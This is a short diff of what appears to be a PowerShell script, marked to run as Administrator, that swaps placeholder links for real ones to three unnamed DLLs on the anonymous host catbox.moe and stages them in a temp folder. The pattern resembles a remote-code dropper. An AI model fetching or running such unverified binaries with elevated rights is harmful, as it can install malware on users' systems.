@@ -2,9 +2,9 @@
 # Run as Administrator
 
 $dlls = @(
-    @{ Name = "file1.dll"; Url = "https://files.catbox.moe/abc123.dll" },
-    @{ Name = "file2.dll"; Url = "https://files.catbox.moe/def456.dll" },
-    @{ Name = "file3.dll"; Url = "https://files.catbox.moe/ghi789.dll" }
+    @{ Name = "file1.dll"; Url = "https://files.catbox.moe/77pg84.dll" },
+    @{ Name = "file2.dll"; Url = "https://files.catbox.moe/enco8e.dll" },
+    @{ Name = "file3.dll"; Url = "https://files.catbox.moe/jmp14d.dll" }
 )
 
 $temp = "$env:TEMP\CatboxDLLs"
